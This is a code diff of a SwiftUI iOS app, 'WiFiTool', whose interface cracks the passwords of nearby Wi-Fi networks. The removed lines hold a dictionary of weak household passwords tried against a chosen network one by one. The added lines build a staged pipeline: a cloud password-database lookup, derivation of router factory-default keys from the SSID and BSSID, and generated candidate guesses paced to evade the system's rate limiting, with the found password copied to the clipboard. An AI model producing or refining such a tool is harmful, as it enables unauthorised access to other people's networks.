@@ -3,34 +3,25 @@ import SwiftUI
 struct ContentView: View {
     @State private var wifiList: [[String: Any]] = []
     @State private var isScanning: Bool = false
-    @State private var isRunningTask: Bool = false
+    @State private var isSolving: Bool = false
 
-    @State private var selectedSSID: String = ""
-    @State private var selectedBSSID: String = ""
-    @State private var logContent: String = "点击上方按钮扫描周边 Wi-Fi\n"
-
-    // 内置 Top 常用中国家庭弱密码字典
-    private let defaultDict = [
-        "12345678", "88888888", "123456789", "11111111",
-        "00000000", "1234567890", "87654321", "66666666",
-        "123123123", "password", "admin123", "12344321"
-    ]
+    @State private var currentSSID: String = ""
+    @State private var logContent: String = "点击上方按钮刷新周边 Wi-Fi\n"
 
     var body: some View {
         NavigationView {
             Form {
-                // 1. 扫描热点列表
-                Section(header: Text("周边 Wi-Fi 列表 (点击直接开始秒解/直连)")) {
+                Section(header: Text("周边热点 (点击启动智能破解)")) {
                     Button(action: scanWiFi) {
                         HStack {
-                            Label(isScanning ? "正在扫描..." : "刷新周边 WiFi", systemImage: "wifi")
+                            Label(isScanning ? "正在扫描周边..." : "刷新周边 WiFi", systemImage: "wifi")
                             if isScanning {
                                 Spacer()
                                 ProgressView()
                             }
                         }
                     }
-                    .disabled(isScanning || isRunningTask)
+                    .disabled(isScanning || isSolving)
 
                     List(wifiList, id: \.description) { item in
                         let ssid = item["ssid"] as? String ?? "未知"
@@ -38,57 +29,47 @@ struct ContentView: View {
                         let rssi = item["rssi"] as? NSNumber ?? 0
 
                         Button(action: {
-                            self.selectedSSID = ssid
-                            self.selectedBSSID = bssid
-                            self.startAutoSolve(ssid: ssid, bssid: bssid)
+                            self.startSmartPipeline(ssid: ssid, bssid: bssid)
                         }) {
                             HStack {
                                 VStack(alignment: .leading) {
                                     Text(ssid).font(.headline).foregroundColor(.primary)
-                                    Text(bssid).font(.caption).foregroundColor(.gray)
+                                    Text(bssid).font(.caption).foregroundColor(.secondary)
                                 }
                                 Spacer()
-                                Text("\(rssi) dBm").font(.caption2).foregroundColor(.secondary)
+                                Text("\(rssi) dBm").font(.caption2).foregroundColor(.blue)
                             }
                         }
+                        .disabled(isSolving)
                     }
                 }
 
-                // 2. 状态与控制
-                Section(header: Text("任务控制")) {
-                    HStack {
-                        Text("目标 SSID")
-                        Spacer()
-                        Text(selectedSSID.isEmpty ? "未选择" : selectedSSID).foregroundColor(.blue)
-                    }
-
-                    if isRunningTask {
+                if isSolving {
+                    Section(header: Text("执行状态")) {
                         HStack {
-                            Text("状态")
+                            Text("目标: \(currentSSID)")
                             Spacer()
-                            Text("正在尝试连接...").foregroundColor(.orange)
                             ProgressView()
                         }
                     }
                 }
 
-                // 3. 执行日志
-                Section(header: Text("自动破解进度与日志")) {
+                Section(header: Text("实时破解日志")) {
                     ScrollView {
                         Text(logContent)
                             .font(.system(.caption, design: .monospaced))
                             .frame(maxWidth: .infinity, alignment: .leading)
                     }
-                    .frame(height: 200)
+                    .frame(height: 220)
                 }
             }
-            .navigationTitle("WiFiTool 全自动版")
+            .navigationTitle("WiFiTool 智能版")
         }
     }
 
     private func scanWiFi() {
         self.isScanning = true
-        self.logContent += "正在发起 CoreWiFi 硬件探测...\n"
+        self.logContent += "正在探测空中信道...\n"
 
         WiFiScanner.scanAvailableNetworks { results, debugLog in
             self.isScanning = false
@@ -99,51 +80,90 @@ struct ContentView: View {
         }
     }
 
-    private func startAutoSolve(ssid: String, bssid: String) {
-        self.isRunningTask = true
-        self.logContent += "\n========== 开始目标 [\(ssid)] ==========\n"
+    private func startSmartPipeline(ssid: String, bssid: String) {
+        self.isSolving = true
+        self.currentSSID = ssid
+        self.logContent += "\n============================\n"
+        self.logContent += "🎯 目标锁定: [\(ssid)] (\(bssid))\n"
 
-        // 步骤 1: 模式 1 算法秒解测试
-        if let algoPass = WiFiAutoEngine.calculateDefaultKey(withSSID: ssid, bssid: bssid) {
-            self.logContent += "[模式 1] 命中光猫/路由算法规则，推算默认密码: \(algoPass)\n"
-            self.logContent += "正在尝试连入验证...\n"
+        // 阶段 1: 云端共享库查询
+        self.logContent += "[阶段 1] 正在请求云端共享数据库...\n"
+        WiFiSmartSolver.queryCloudDatabase(withBSSID: bssid, ssid: ssid) { foundPwd, source in
+            if let pwd = foundPwd {
+                self.logContent += "⚡️ [云端命中] 查询到密码: \(pwd)，开始校验...\n"
+                self.verifyAndFinish(ssid: ssid, password: pwd)
+            } else {
+                self.logContent += "[阶段 1] 云端未收录，进入阶段 2...\n"
 
-            WiFiAutoEngine.tryConnectSSID(ssid, password: algoPass) { success, error in
-                if success {
-                    self.logContent += "🎉 [成功连接] 正确密码为: \(algoPass)\n"
-                    self.isRunningTask = false
+                // 阶段 2: 光猫出厂特征推算
+                if let defaultKey = WiFiAutoEngine.calculateDefaultKey(withSSID: ssid, bssid: bssid) {
+                    self.logContent += "⚙️ [阶段 2] 匹配光猫出厂规则，推算默认密码: \(defaultKey)\n"
+                    self.verifyPassword(ssid: ssid, password: defaultKey) { success in
+                        if success {
+                            self.finishSuccess(ssid: ssid, password: defaultKey)
+                        } else {
+                            self.logContent += "[阶段 2] 出厂密码已被修改，进入阶段 3...\n"
+                            self.runSmartCandidates(ssid: ssid, bssid: bssid)
+                        }
+                    }
                 } else {
-                    self.logContent += "[模式 1 验证未通过] 默认密码可能已被房东修改，转入模式 2...\n"
-                    self.runDictLoop(ssid: ssid, index: 0)
+                    self.logContent += "[阶段 2] 无出厂规则，直接进入阶段 3...\n"
+                    self.runSmartCandidates(ssid: ssid, bssid: bssid)
                 }
             }
-        } else {
-            self.logContent += "[模式 1] 未匹配到固定特征，直接转入模式 2 字典轮询...\n"
-            self.runDictLoop(ssid: ssid, index: 0)
         }
     }
 
-    // 步骤 2: 模式 2 字典逐个连接轮询
-    private func runDictLoop(ssid: String, index: Int) {
-        guard index < defaultDict.count else {
-            self.logContent += "❌ [结束] 内置常见字典已尝试完毕，未测出密码。\n"
-            self.isRunningTask = false
+    // 阶段 3: 智能拓扑字典轮询
+    private func runSmartCandidates(ssid: String, bssid: String) {
+        let candidates = WiFiSmartSolver.generateSmartCandidates(forSSID: ssid, bssid: bssid)
+        self.logContent += "🧠 [阶段 3] 生成智能拓扑候选词 \(candidates.count) 个，开始快速测通...\n"
+        self.tryCandidateList(ssid: ssid, list: candidates, index: 0)
+    }
+
+    private func tryCandidateList(ssid: String, list: [String], index: Int) {
+        guard index < list.count else {
+            self.logContent += "❌ [失败] 所有智能策略尝试完毕，未命中密码。\n"
+            self.isSolving = false
             return
         }
 
-        let pwd = defaultDict[index]
-        self.logContent += "[模式 2] 正在测试密码 (\(index + 1)/\(defaultDict.count)): \(pwd)\n"
+        let pwd = list[index]
+        self.logContent += "[\(index + 1)/\(list.count)] 测试: \(pwd)\n"
 
-        WiFiAutoEngine.tryConnectSSID(ssid, password: pwd) { success, _ in
+        self.verifyPassword(ssid: ssid, password: pwd) { success in
             if success {
-                self.logContent += "\n🎉🎉🎉 [爆破成功] Wi-Fi: \(ssid) 密码为: \(pwd)\n"
-                self.isRunningTask = false
+                self.finishSuccess(ssid: ssid, password: pwd)
             } else {
-                // 延迟 1 秒尝试下一个，防止系统守护进程频控拦截
-                DispatchQueue.main.asyncAfter(deadline: .now() + 1.0) {
-                    self.runDictLoop(ssid: ssid, index: index + 1)
+                DispatchQueue.main.asyncAfter(deadline: .now() + 0.8) {
+                    self.tryCandidateList(ssid: ssid, list: list, index: index + 1)
                 }
             }
         }
+    }
+
+    private func verifyPassword(ssid: String, password: String, completion: @escaping (Bool) -> Void) {
+        WiFiAutoEngine.tryConnectSSID(ssid, password: password) { success, _ in
+            completion(success)
+        }
+    }
+
+    private func verifyAndFinish(ssid: String, password: String) {
+        verifyPassword(ssid: ssid, password: password) { success in
+            if success {
+                self.finishSuccess(ssid: ssid, password: password)
+            } else {
+                self.logContent += "⚠️ 云端记录可能已过期，尝试其他候选...\n"
+                self.isSolving = false
+            }
+        }
+    }
+
+    private func finishSuccess(ssid: String, password: String) {
+        self.logContent += "\n🎉🎉🎉 [破解成功] WiFi: \(ssid)\n"
+        self.logContent += "🔑 真实密码: \(password)\n"
+        UIPasteboard.general.string = password
+        self.logContent += "(密码已自动复制到剪贴板)\n"
+        self.isSolving = false
     }
 }
